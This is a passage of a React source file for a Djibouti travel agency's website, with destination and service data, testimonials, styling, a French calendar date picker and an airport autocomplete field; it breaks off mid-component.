import { useState, useEffect, useRef } from "react";
import { createPortal } from "react-dom";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

// ── PALETTE ────────────────────────────────────────────────────────────────────
const T = {
  navy:    "#0B1F3A",
  navyD:   "#060F1E",
  blue:    "#1565C0",
  blueL:   "#1E88E5",
  sky:     "#4FC3F7",
  gold:    "#F5A623",
  goldD:   "#D4881A",
  white:   "#FFFFFF",
  gray50:  "#F8FAFC",
  gray100: "#F1F5F9",
  gray300: "#CBD5E1",
  gray500: "#64748B",
  gray700: "#334155",
};

// ── DESTINATIONS DJIBOUTI ──────────────────────────────────────────────────────
const DESTINATIONS = [
  { name:"Lac Assal", tag:"Incontournable", desc:"Le point le plus bas d'Afrique • 155m sous le niveau de la mer", img:"https://commons.wikimedia.org/wiki/Special:FilePath/Lake_Assal_1-Djibouti.jpg", color:"#0B4D68" },
  { name:"Lac Abbé", tag:"Aventure", desc:"Cheminées de calcaire • Paysage lunaire unique au monde", img:"https://commons.wikimedia.org/wiki/Special:FilePath/Lac_Abbe.JPG", color:"#5C3A1E" },
  { name:"Requins baleines", tag:"Plongée", desc:"Golfe de Tadjoura • Novembre à Février", img:"https://commons.wikimedia.org/wiki/Special:FilePath/Whale_Shark_AdF.jpg", color:"#0D4A7A" },
  { name:"Ville de Djibouti", tag:"Culture", desc:"Capitale cosmopolite • Carrefour de l'Afrique et de l'Orient", img:"https://commons.wikimedia.org/wiki/Special:FilePath/An_aerial_view_of_Djibouti_City.jpg", color:"#1A237E" },
  { name:"Golfe de Tadjoura", tag:"Nature", desc:"Eaux turquoise • Faune marine exceptionnelle", img:"https://commons.wikimedia.org/wiki/Special:FilePath/%C3%8Ele_maskali,_Djibouti.jpg", color:"#01579B" },
];

// ── SERVICES ──────────────────────────────────────────────────────────────────
const SERVICES = [
  { img:"https://commons.wikimedia.org/wiki/Special:FilePath/White_Plane_Blue_Sky.jpg", title:"Billets d'Avion", desc:"Vols internationaux depuis Djibouti. Meilleurs tarifs garantis.", color:"#1565C0" },
  { img:"https://commons.wikimedia.org/wiki/Special:FilePath/Hotel_room_interior_at_hotel_Radisson_Blu_Oulu.jpg", title:"Hôtels & Séjours", desc:"Sélection d'hôtels à Djibouti et dans le monde entier.", color:"#0D47A1" },
  { img:"https://commons.wikimedia.org/wiki/Special:FilePath/Kaaba_%281%29_Makkah_%28Mecca%29.jpg", title:"Omra", desc:"Packages complets Omra. Accompagnement spirituel.", color:"#4527A0" },
  { img:"https://commons.wikimedia.org/wiki/Special:FilePath/Car_rental_facility_near_DIA_filled_with_cars_during_the_pandemic._2020-04-30.jpg", title:"Location de Voitures", desc:"Véhicules disponibles à Djibouti. Chauffeurs expérimentés.", color:"#006064" },
  { img:"https://commons.wikimedia.org/wiki/Special:FilePath/My_collection_of_passport_stamps.jpg", title:"Visa & Documents", desc:"Assistance visa pour toutes destinations. Traitement rapide.", color:"#1B5E20" },
  { img:"https://commons.wikimedia.org/wiki/Special:FilePath/Man_looking_for_new_travel_destinations_on_the_world_map.jpg", title:"Voyages Organisés", desc:"Circuits à Djibouti et en Afrique de l'Est. Groupes et individuels.", color:"#E65100" },
];

// ── TÉMOIGNAGES ───────────────────────────────────────────────────────────────
const TESTIMONIALS = [
  { name:"Ahmed Hassan", role:"Homme d'affaires, Djibouti", text:"Alamin Travel a géré tous mes déplacements professionnels pendant 3 ans. Service impeccable, toujours disponibles à toute heure.", stars:5 },
  { name:"Fatouma Ali", role:"Famille, Djibouti", text:"Nos vacances en famille étaient parfaites. Tout était organisé : billets, hôtel, transferts. Je recommande sans hésiter !", stars:5 },
  { name:"Mohamed Idriss", role:"Pèlerin, Omra 2024", text:"Le package Omra était exceptionnel. Hébergement à deux pas de la Mosquée, accompagnement spirituel de qualité.", stars:5 },
  { name:"Khadija Omar", role:"Étudiante, Paris", text:"Ils m'ont aidé avec mon visa étudiant et mon billet. Réactifs, professionnels. Merci infiniment à toute l'équipe !", stars:5 },
];

// ── STATS ─────────────────────────────────────────────────────────────────────
const STATS = [
  { value:"15+", label:"Années d'expérience", icon:"🏆" },
  { value:"500+", label:"Clients satisfaits", icon:"👥" },
  { value:"50+", label:"Destinations", icon:"🌍" },
  { value:"24/7", label:"Support disponible", icon:"📞" },
];

// ── COMPAGNIES AÉRIENNES ──────────────────────────────────────────────────────
const AIRLINES = [
  { name:"Qatar Airways", logo:"https://commons.wikimedia.org/wiki/Special:FilePath/Qatar_Airways_logo.svg" },
  { name:"Ethiopian Airlines", logo:"https://commons.wikimedia.org/wiki/Special:FilePath/Ethiopian_Airlines_Logo.svg" },
  { name:"Emirates", logo:"https://commons.wikimedia.org/wiki/Special:FilePath/Emirates_logo.svg" },
  { name:"flydubai", logo:"https://commons.wikimedia.org/wiki/Special:FilePath/Fly_Dubai_logo_2010_05.svg" },
  { name:"flynas", logo:"https://commons.wikimedia.org/wiki/Special:FilePath/Flynas_Logo.svg" },
  { name:"Turkish Airlines", logo:"https://commons.wikimedia.org/wiki/Special:FilePath/Turkish_Airlines_logo_2019_compact.svg" },
  { name:"Air France", logo:"https://commons.wikimedia.org/wiki/Special:FilePath/Air_France_Logo.svg" },
  { name:"Kenya Airways", logo:"https://commons.wikimedia.org/wiki/Special:FilePath/Kenya_Airways_Logo.svg" },
  { name:"Saudia", logo:"https://commons.wikimedia.org/wiki/Special:FilePath/Saudia_logo_2023.png" },
  { name:"IATA", logo:"https://commons.wikimedia.org/wiki/Special:FilePath/IATA_logo.svg" },
];

// ── ICÔNE WHATSAPP (SVG officielle) ───────────────────────────────────────────
const WhatsAppIcon = ({ size = 18, color = "white" }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill={color} xmlns="http://www.w3.org/2000/svg">
    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/>
    <path d="M12.001 2.003c-5.514 0-9.997 4.483-9.997 9.997 0 1.762.462 3.489 1.34 5.007L2.06 21.998l5.13-1.246a9.96 9.96 0 004.81 1.226h.004c5.514 0 9.997-4.483 9.997-9.997 0-2.67-1.04-5.18-2.929-7.07a9.933 9.933 0 00-7.07-2.908zm0 18.174h-.003a8.28 8.28 0 01-4.216-1.156l-.303-.18-3.043.784.812-2.968-.198-.305a8.283 8.283 0 01-1.267-4.408c0-4.583 3.729-8.313 8.32-8.313 2.222 0 4.31.868 5.879 2.44a8.26 8.26 0 012.436 5.878c0 4.583-3.73 8.229-8.417 8.229z"/>
  </svg>
);

// ── ICÔNES DU WIDGET DE RECHERCHE (traits fins, cohérentes avec la charte) ───
const SearchIcons = {
  takeoff: (p) => <svg width={p.size||16} height={p.size||16} viewBox="0 0 24 24" fill="none" stroke={p.color||"currentColor"} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M2.5 19h19"/><path d="M17 19l-5.5-11L6 10.5"/><path d="M11.5 8L21 5"/></svg>,
  landing: (p) => <svg width={p.size||16} height={p.size||16} viewBox="0 0 24 24" fill="none" stroke={p.color||"currentColor"} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M2.5 19h19"/><path d="M4 14l7-3 9 4-3 3-6-1.5-5 2z"/></svg>,
  calendar: (p) => <svg width={p.size||16} height={p.size||16} viewBox="0 0 24 24" fill="none" stroke={p.color||"currentColor"} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="5" width="18" height="16" rx="2"/><path d="M3 10h18M8 3v4M16 3v4"/></svg>,
  users: (p) => <svg width={p.size||16} height={p.size||16} viewBox="0 0 24 24" fill="none" stroke={p.color||"currentColor"} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><circle cx="9" cy="8" r="3.2"/><path d="M2.5 20c0-3.3 2.9-5.5 6.5-5.5s6.5 2.2 6.5 5.5"/><path d="M16 8.2a3 3 0 010 5.9M19.5 20c0-2.8-1.7-4.8-4-5.4"/></svg>,
  search: (p) => <svg width={p.size||16} height={p.size||16} viewBox="0 0 24 24" fill="none" stroke={p.color||"currentColor"} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>,
  swap: (p) => <svg width={p.size||16} height={p.size||16} viewBox="0 0 24 24" fill="none" stroke={p.color||"currentColor"} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17 3l4 4-4 4"/><path d="M3 7h18"/><path d="M7 21l-4-4 4-4"/><path d="M21 17H3"/></svg>,
  plus: (p) => <svg width={p.size||14} height={p.size||14} viewBox="0 0 24 24" fill="none" stroke={p.color||"currentColor"} strokeWidth="2.2" strokeLinecap="round"><path d="M12 5v14M5 12h14"/></svg>,
  trash: (p) => <svg width={p.size||16} height={p.size||16} viewBox="0 0 24 24" fill="none" stroke={p.color||"currentColor"} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M4 7h16M9 7V4h6v3M6 7l1 14h10l1-14"/></svg>,
  ticket: (p) => <svg width={p.size||16} height={p.size||16} viewBox="0 0 24 24" fill="none" stroke={p.color||"currentColor"} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M3 8a2 2 0 012-2h14a2 2 0 012 2v2a2 2 0 000 4v2a2 2 0 01-2 2H5a2 2 0 01-2-2v-2a2 2 0 000-4V8z"/><path d="M14 6v12" strokeDasharray="2 3"/></svg>,
};


// (aucune retouche de couleur/forme), centrée, responsive, proportions conservées.
// Fichier attendu : /public/alamin-logo.png
const Logo = ({ size = 52 }) => (
  <div style={{ display:"flex", alignItems:"center", justifyContent:"center" }}>
    <img
      src="/alamin-logo.png"
      alt="Alamin Tourism & Travel — Agent IATA Accrédité"
      style={{
        width: size * 4.2,
        maxWidth: "100%",
        height: "auto",
        objectFit: "contain",
        display: "block",
      }}
    />
  </div>
);

// ── STYLES GLOBAUX ─────────────────────────────────────────────────────────────
const GLOBAL_CSS = `
  @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=DM+Sans:wght@300;400;500;600&display=swap');
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family:'DM Sans', sans-serif; background:#fff; color:${T.navy}; }
  ::-webkit-scrollbar { width:6px; }
  ::-webkit-scrollbar-track { background:#f1f5f9; }
  ::-webkit-scrollbar-thumb { background:${T.blue}; border-radius:3px; }

  @keyframes fadeUp { from { opacity:0; transform:translateY(30px); } to { opacity:1; transform:translateY(0); } }
  @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
  @keyframes scrollX { 0%{transform:translateX(0)} 100%{transform:translateX(-50%)} }
  @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
  @keyframes float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-10px)} }

  .fade-up { animation: fadeUp 0.7s ease both; }
  .fade-in { animation: fadeIn 0.5s ease both; }
  .al-track { display:flex; animation:scrollX 25s linear infinite; width:max-content; }
  .al-track:hover { animation-play-state:paused; }
  .dest-card:hover .dest-img { transform:scale(1.08); }
  .dest-card:hover .dest-overlay { opacity:1; }
  .service-card:hover { transform:translateY(-6px); box-shadow:0 20px 60px rgba(21,101,192,0.15) !important; }
  .btn-primary:hover { transform:translateY(-2px); box-shadow:0 8px 25px rgba(21,101,192,0.4) !important; }
  .btn-gold:hover { transform:translateY(-2px); box-shadow:0 8px 25px rgba(245,166,35,0.5) !important; }
  .nav-link:hover { color:${T.sky} !important; }
  .testimonial-card:hover { transform:translateY(-4px); }

  /* ── RESPONSIVE / MOBILE ─────────────────────────────────────────────── */
  .mobile-menu-btn { display:none; }

  @media (max-width: 900px) {
    .desktop-nav-links { display:none !important; }
    .desktop-nav-actions { display:none !important; }
    .mobile-menu-btn { display:flex !important; }
    nav > div { padding: 0 20px !important; }
  }

  @media (max-width: 768px) {
    section { padding-left:20px !important; padding-right:20px !important; }
    .hero-section { padding-left:0 !important; padding-right:0 !important; }
    .hero-content { padding-left:20px !important; padding-right:20px !important; padding-top:110px !important; }
    .hero-flex { flex-direction:column !important; align-items:flex-start !important; }
    .hero-title { font-size:38px !important; }
    .hero-contact-card { margin-left:0 !important; margin-top:28px !important; width:100%; }
    .hero-stats { gap:24px !important; }
    .section-title { font-size:30px !important; }
    .services-grid, .packages-grid, .testimonials-grid { grid-template-columns:1fr !important; }
    .dest-grid { grid-template-columns:1fr !important; grid-template-rows:auto !important; }
    .dest-grid > div { grid-row:auto !important; height:220px !important; }
    .dest-header { flex-direction:column !important; align-items:flex-start !important; gap:16px; }
    .dest-header p { text-align:left !important; max-width:100% !important; }
    .agence-photos-grid { grid-template-columns:1fr 1fr !important; }
    .agence-photos-grid > div:first-child { grid-column:span 2 !important; }
    .agence-info-grid { grid-template-columns:1fr !important; }
    .footer-grid { grid-template-columns:1fr 1fr !important; gap:28px !important; }
    .cta-title { font-size:32px !important; }
    .cta-split { grid-template-columns:1fr !important; }
  }

  @media (max-width: 480px) {
    .footer-grid { grid-template-columns:1fr !important; }
    .hero-title { font-size:30px !important; }
    .section-title { font-size:26px !important; }
    .flight-search-form { flex-direction:column !important; }
    .flight-search-form > div, .flight-search-form > button[type="submit"] { width:100% !important; }
    .flight-search-form input, .flight-search-form select, .flight-search-form button:not([title="Inverser"]) {
      width:100% !important; min-width:0 !important;
    }
  }
`;

// ══════════════════════════════════════════════════════════════════════════════
// RECHERCHE & RÉSERVATION DE VOLS (Ethiopian Airlines - API NDC directe)
// ══════════════════════════════════════════════════════════════════════════════
const inputStyle = {
  flex: 1, minWidth: 130, padding: "13px 16px", border: `1px solid ${T.gray300}`,
  borderRadius: 10, fontSize: 14, fontFamily: "inherit", color: T.navy, background: "white",
};

// ── SÉLECTEUR DE DATE (calendrier français, remplace les inputs natifs jj/mm/aaaa) ──
const MONTHS_FR = ["Janvier","Février","Mars","Avril","Mai","Juin","Juillet","Août","Septembre","Octobre","Novembre","Décembre"];
const DAYS_FR = ["D","L","M","M","J","V","S"];

function toISO(d) {
  const y = d.getFullYear();
  const m = String(d.getMonth() + 1).padStart(2, "0");
  const day = String(d.getDate()).padStart(2, "0");
  return `${y}-${m}-${day}`;
}
function fromISO(s) {
  if (!s) return null;
  const [y, m, d] = s.split("-").map(Number);
  return new Date(y, m - 1, d);
}
function formatShort(s) {
  const d = fromISO(s);
  if (!d) return null;
  return `${d.getDate()} ${MONTHS_FR[d.getMonth()].slice(0, 3).toLowerCase()}`;
}
function isSameDay(a, b) {
  return a && b && a.getFullYear() === b.getFullYear() && a.getMonth() === b.getMonth() && a.getDate() === b.getDate();
}
function startOfDay(d) {
  const n = new Date(d);
  n.setHours(0, 0, 0, 0);
  return n;
}
function buildMonthGrid(year, month) {
  const first = new Date(year, month, 1);
  const firstWeekday = first.getDay(); // dimanche = 0, comme le calendrier Ethiopian
  const daysInMonth = new Date(year, month + 1, 0).getDate();
  const cells = [];
  for (let i = 0; i < firstWeekday; i++) cells.push(null);
  for (let d = 1; d <= daysInMonth; d++) cells.push(new Date(year, month, d));
  while (cells.length % 7 !== 0) cells.push(null);
  const weeks = [];
  for (let i = 0; i < cells.length; i += 7) weeks.push(cells.slice(i, i + 7));
  return weeks;
}

function DatePickerField({ mode, value, onChangeSingle, startValue, endValue, onChangeRange, label, restrict = "futureOnly" }) {
  const [open, setOpen] = useState(false);
  const today = startOfDay(new Date());
  const initialRef = mode === "single" ? (fromISO(value) || today) : (fromISO(startValue) || today);
  const [viewYear, setViewYear] = useState(initialRef.getFullYear());
  const [viewMonth, setViewMonth] = useState(initialRef.getMonth());
  const [coords, setCoords] = useState({ top: 0, left: 0 });
  const btnRef = useRef(null);
  const popRef = useRef(null);

  const popoverWidth = mode === "range" ? 460 : 260;

  function openPopover() {
    if (btnRef.current) {
      const rect = btnRef.current.getBoundingClientRect();
      let left = rect.left;
      const maxLeft = window.innerWidth - popoverWidth - 12;
      if (left > maxLeft) left = Math.max(12, maxLeft);
      setCoords({ top: rect.bottom + 10, left });
    }
    setOpen(true);
  }

  // FIX: le calendrier est affiché via un portail dans document.body, pour ne jamais être
  // coupé par un ancêtre en overflow:hidden ni recouvert par une section suivante
  // (problème de contexte d'empilement CSS observé avec le positionnement "absolute" classique).
  useEffect(() => {
    function handleClickOutside(e) {
      if (
        btnRef.current && !btnRef.current.contains(e.target) &&
        popRef.current && !popRef.current.contains(e.target)
      ) {
        setOpen(false);
      }
    }
    function handleScrollOrResize() { setOpen(false); }
    document.addEventListener("mousedown", handleClickOutside);
    window.addEventListener("scroll", handleScrollOrResize, true);
    window.addEventListener("resize", handleScrollOrResize);
    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
      window.removeEventListener("scroll", handleScrollOrResize, true);
      window.removeEventListener("resize", handleScrollOrResize);
    };
  }, []);

  const selStart = mode === "range" ? fromISO(startValue) : fromISO(value);
  const selEnd = mode === "range" ? fromISO(endValue) : null;
  const pickingReturn = mode === "range" && !!selStart && !selEnd;

  function isDisabledDay(day) {
    if (restrict === "futureOnly") return day < today;
    if (restrict === "pastOnly") return day > today;
    return false;
  }

  function goMonth(delta) {
    let m = viewMonth + delta, y = viewYear;
    if (m < 0) { m = 11; y -= 1; }
    if (m > 11) { m = 0; y += 1; }
    setViewMonth(m);
    setViewYear(y);
  }

  function handlePick(day) {
    if (!day || isDisabledDay(day)) return;
    if (mode === "single") {
      onChangeSingle(toISO(day));
      setOpen(false);
      return;
    }
    // Mode aller-retour : ne ferme plus automatiquement — l'utilisateur confirme via le bouton
    if (!selStart || (selStart && selEnd) || day < selStart) {
      onChangeRange(toISO(day), null);
    } else {
      onChangeRange(toISO(selStart), toISO(day));
    }
  }

  function resetToPickStart() {
    if (mode === "range") onChangeRange(null, null);
  }

  const canGoPrev = restrict === "futureOnly" ? !(viewYear === today.getFullYear() && viewMonth === today.getMonth()) : true;
  const canGoNext = restrict === "pastOnly" ? !(viewYear === today.getFullYear() && viewMonth === today.getMonth()) : true;
  const yearOptions = restrict === "pastOnly"
    ? Array.from({ length: 100 }, (_, i) => today.getFullYear() - i)
    : Array.from({ length: 16 }, (_, i) => today.getFullYear() + i);
  const hasValue = mode === "single" ? !!value : !!startValue;
  const displayLabel = mode === "single"
    ? (formatShort(value) || label || "Date")
    : (startValue ? `${formatShort(startValue)}${endValue ? " — " + formatShort(endValue) : ""}` : (label || "Dates"));

  // Un mois pour l'aller simple / multi-destinations, deux mois côte à côte pour l'aller-retour
  const monthsToShow = mode === "range" ? [0, 1] : [0];

  function renderMonthCard(offset) {
    let m = viewMonth + offset, y = viewYear;
    if (m > 11) { m -= 12; y += 1; }
    const weeks = buildMonthGrid(y, m);
    return (
      <div key={offset} style={{ minWidth: 220, flex: "1 1 220px" }}>
        {offset === 0 && (
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, marginBottom: 10 }}>
            <select value={viewMonth} onChange={(e) => setViewMonth(Number(e.target.value))} style={{
              border: `1px solid ${T.gray300}`, borderRadius: 6, fontSize: 12, fontWeight: 700, color: T.navy,
              fontFamily: "inherit", padding: "4px 6px", background: "white",
            }}>
              {MONTHS_FR.map((mn, i) => <option key={i} value={i}>{mn}</option>)}
            </select>
            <select value={viewYear} onChange={(e) => setViewYear(Number(e.target.value))} style={{
              border: `1px solid ${T.gray300}`, borderRadius: 6, fontSize: 12, fontWeight: 700, color: T.navy,
              fontFamily: "inherit", padding: "4px 6px", background: "white",
            }}>
              {yearOptions.map((yr) => <option key={yr} value={yr}>{yr}</option>)}
            </select>
          </div>
        )}
        {offset !== 0 && (
          <div style={{ textAlign: "center", fontSize: 12.5, fontWeight: 700, color: T.navy, letterSpacing: 0.5, textTransform: "uppercase", marginBottom: 10 }}>
            {MONTHS_FR[m]} {y}
          </div>
        )}
        <div style={{ display: "grid", gridTemplateColumns: "repeat(7,1fr)", marginBottom: 2 }}>
          {DAYS_FR.map((d, i) => (
            <div key={i} style={{ textAlign: "center", fontSize: 10, fontWeight: 700, color: T.gray500, padding: "4px 0" }}>{d}</div>
          ))}
        </div>
        {weeks.map((week, wi) => (
          <div key={wi} style={{ display: "grid", gridTemplateColumns: "repeat(7,1fr)" }}>
            {week.map((day, di) => {
              if (!day) return <div key={di} />;
              const disabled = isDisabledDay(day);
              const isStart = selStart && isSameDay(day, selStart);
              const isEnd = selEnd && isSameDay(day, selEnd);
              const inRange = mode === "range" && selStart && selEnd && day > selStart && day < selEnd;
              let bg = "transparent", color = T.navy, fontWeight = 500, radius = 8;
              if (isStart || isEnd) { bg = T.blue; color = "white"; fontWeight = 700; }
              else if (inRange) { bg = `${T.blue}18`; color = T.navy; radius = 0; }
              return (
                <button key={di} type="button" disabled={disabled} onClick={() => handlePick(day)} style={{
                  border: "none", background: bg, color: disabled ? T.gray300 : color, fontWeight,
                  borderRadius: radius, height: 30, margin: "1px 0", fontSize: 12, cursor: disabled ? "default" : "pointer",
                  fontFamily: "inherit",
                }}>{day.getDate()}</button>
              );
            })}
          </div>
        ))}
      </div>
    );
  }

  return (
    <div style={{ flex: 1, minWidth: 0 }}>
      <button ref={btnRef} type="button" onClick={() => (open ? setOpen(false) : openPopover())} style={{
        display: "flex", alignItems: "center", gap: 8, border: "none", background: "transparent", cursor: "pointer",
        width: "100%", padding: 0, fontFamily: "inherit", textAlign: "left",
      }}>
        {SearchIcons.calendar({ size: 15, color: T.gray500 })}
        <span style={{ fontSize: 13.5, fontWeight: 600, color: hasValue ? T.navy : T.gray500, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
          {displayLabel}
        </span>
      </button>

      {open && createPortal(
        <div ref={popRef} style={{
          position: "fixed", top: coords.top, left: coords.left, zIndex: 9999,
          background: "white", borderRadius: 16, boxShadow: "0 12px 40px rgba(11,31,58,0.22)",
          border: `1px solid ${T.gray100}`, padding: 18, width: popoverWidth,
          maxWidth: "94vw", boxSizing: "border-box",
        }}>
          {mode === "range" && (
            <div style={{ display: "flex", borderBottom: `1px solid ${T.gray100}`, marginBottom: 14 }}>
              <button type="button" onClick={resetToPickStart} style={{
                flex: 1, textAlign: "center", padding: "0 0 10px", border: "none", background: "none", cursor: "pointer", fontFamily: "inherit",
                fontSize: 11.5, fontWeight: 700, letterSpacing: 0.5, color: !pickingReturn ? T.blue : T.gray500,
                borderBottom: !pickingReturn ? `2px solid ${T.blue}` : "2px solid transparent", marginBottom: -1,
              }}>DÉPART{selStart ? ` · ${formatShort(startValue)}` : ""}</button>
              <div style={{
                flex: 1, textAlign: "center", padding: "0 0 10px", fontSize: 11.5, fontWeight: 700, letterSpacing: 0.5,
                color: pickingReturn ? T.blue : (selEnd ? T.navy : T.gray300),
                borderBottom: pickingReturn ? `2px solid ${T.blue}` : "2px solid transparent", marginBottom: -1,
              }}>RETOUR{selEnd ? ` · ${formatShort(endValue)}` : ""}</div>
            </div>
          )}

          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
            <button type="button" onClick={() => canGoPrev && goMonth(-1)} disabled={!canGoPrev} style={{
              border: `1px solid ${T.gray300}`, background: "white", cursor: canGoPrev ? "pointer" : "default", color: canGoPrev ? T.navy : T.gray300,
              width: 28, height: 28, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 15, fontFamily: "inherit",
            }}>‹</button>
            <div style={{ fontSize: 11, color: T.gray500 }}>
              {mode === "range" ? "Cliquez le départ, puis le retour" : "Sélectionnez une date"}
            </div>
            <button type="button" onClick={() => canGoNext && goMonth(1)} disabled={!canGoNext} style={{
              border: `1px solid ${T.gray300}`, background: "white", cursor: canGoNext ? "pointer" : "default", color: canGoNext ? T.navy : T.gray300,
              width: 28, height: 28, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 15, fontFamily: "inherit",
            }}>›</button>
          </div>

          <div style={{ display: "flex", gap: 20, flexWrap: "wrap" }}>
            {monthsToShow.map((offset) => renderMonthCard(offset))}
          </div>

          {mode === "range" && (
            <div style={{ display: "flex", justifyContent: "flex-end", gap: 8, marginTop: 14, paddingTop: 12, borderTop: `1px solid ${T.gray100}` }}>
              <button type="button" onClick={() => setOpen(false)} disabled={!selStart || !selEnd} style={{
                padding: "8px 20px", borderRadius: 8, border: "none", cursor: (selStart && selEnd) ? "pointer" : "default",
                background: (selStart && selEnd) ? T.blue : T.gray100, color: (selStart && selEnd) ? "white" : T.gray500,
                fontSize: 12.5, fontWeight: 700, fontFamily: "inherit",
              }}>Confirmer</button>
            </div>
          )}
        </div>,
        document.body
      )}
    </div>
  );
}

// ── AUTOCOMPLÉTION AÉROPORTS (tape "JIB" → affiche "Djibouti — Djibouti") ──
const AIRPORTS = [
  { code: "JIB", city: "Djibouti", country: "Djibouti" },
  { code: "ADD", city: "Addis-Abeba", country: "Éthiopie" },
  { code: "DXB", city: "Dubaï", country: "Émirats arabes unis" },
  { code: "AUH", city: "Abou Dabi", country: "Émirats arabes unis" },
  { code: "DOH", city: "Doha", country: "Qatar" },
  { code: "IST", city: "Istanbul", country: "Turquie" },
  { code: "CDG", city: "Paris", country: "France" },
  { code: "NBO", city: "Nairobi", country: "Kenya" },
  { code: "JED", city: "Djeddah", country: "Arabie Saoudite" },
  { code: "MED", city: "Médine", country: "Arabie Saoudite" },
  { code: "RUH", city: "Riyad", country: "Arabie Saoudite" },
  { code: "CAI", city: "Le Caire", country: "Égypte" },
  { code: "MGQ", city: "Mogadiscio", country: "Somalie" },
  { code: "HGA", city: "Hargeisa", country: "Somaliland" },
  { code: "ASM", city: "Asmara", country: "Érythrée" },
  { code: "KRT", city: "Khartoum", country: "Soudan" },
  { code: "DAR", city: "Dar es Salaam", country: "Tanzanie" },
  { code: "EBB", city: "Entebbe / Kampala", country: "Ouganda" },
  { code: "KGL", city: "Kigali", country: "Rwanda" },
  { code: "JNB", city: "Johannesburg", country: "Afrique du Sud" },
  { code: "LHR", city: "Londres", country: "Royaume-Uni" },
  { code: "FRA", city: "Francfort", country: "Allemagne" },
  { code: "MCT", city: "Mascate", country: "Oman" },
  { code: "KWI", city: "Koweït", country: "Koweït" },
  { code: "BAH", city: "Manama", country: "Bahreïn" },
  { code: "AMM", city: "Amman", country: "Jordanie" },
  { code: "BEY", city: "Beyrouth", country: "Liban" },
  { code: "MXP", city: "Milan", country: "Italie" },
  { code: "FCO", city: "Rome", country: "Italie" },
  { code: "MAD", city: "Madrid", country: "Espagne" },
  { code: "BRU", city: "Bruxelles", country: "Belgique" },
  { code: "AMS", city: "Amsterdam", country: "Pays-Bas" },
  { code: "GVA", city: "Genève", country: "Suisse" },
  { code: "ZRH", city: "Zurich", country: "Suisse" },
  { code: "DEL", city: "New Delhi", country: "Inde" },
  { code: "BKK", city: "Bangkok", country: "Thaïlande" },
  { code: "KUL", city: "Kuala Lumpur", country: "Malaisie" },
  { code: "SIN", city: "Singapour", country: "Singapour" },
  { code: "CMN", city: "Casablanca", country: "Maroc" },
  { code: "TUN", city: "Tunis", country: "Tunisie" },
  { code: "ALG", city: "Alger", country: "Algérie" },
  { code: "IAD", city: "Washington", country: "États-Unis" },
  { code: "JFK", city: "New York", country: "États-Unis" },
];

function matchAirports(query) {
  if (!query) return AIRPORTS.slice(0, 8);
  const q = query.toLowerCase();
  const starts = AIRPORTS.filter((a) => a.code.toLowerCase().startsWith(q));
  const rest = AIRPORTS.filter((a) =>
    !a.code.toLowerCase().startsWith(q) &&
    (a.code.toLowerCase().includes(q) || a.city.toLowerCase().includes(q) || a.country.toLowerCase().includes(q))
  );
  return [...starts, ...rest].slice(0, 8);
}

function AirportField({ value, onChange, placeholder, icon }) {
  const [text, setText] = useState(value || "");
  const [open, setOpen] = useState(false);
  const [coords, setCoords] = useState({ top: 0, left: 0, width: 0 });
  const wrapDivRef = useRef(null);
  const popRef = useRef(null);

  useEffect(() => { setText(value || ""); }, [value]);

  function openList() {
    if (wrapDivRef.current) {
      const rect = wrapDivRef.current.getBoundingClientRect();
      setCoords({ top: rect.bottom + 8, left: rect.left, width: rect.width });
    }
    setOpen(true);
  }

  useEffect(() => {
    function handleClickOutside(e) {
      if (
        wrapDivRef.current && !wrapDivRef.current.contains(e.target) &&
        popRef.current && !popRef.current.contains(e.target)
      ) {
        setOpen(false);
      }
    }
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  const matches = matchAirports(text);

  function selectAirport(a) {
    setText(a.code);
    onChange(a.code);
    setOpen(false);
  }

  return (
    <div ref={wrapDivRef} style={{ flex: 1, display: "flex", alignItems: "center", gap: 8, minWidth: 0 }}>
      {icon}
      <input
        placeholder={placeholder} maxLength={3} value={text}
        onFocus={openList}
        onChange={(e) => {
          const v = e.target.value.toUpperCase();
          setText(v);
          onChange(v);
          openList();
        }}
        style={{ border: "none", outline: "none", width: "100%", fontSize: 15, fontWeight: 600, color: T.navy, textTransform: "uppercase", fontFamily: "inherit" }}
      />
      {open && matches.length > 0 && createPortal(
        <div ref={popRef} style={{
          position: "fixed", top: coords.top, left: coords.left, width: Math.max(coords.width, 240), zIndex: 9999,
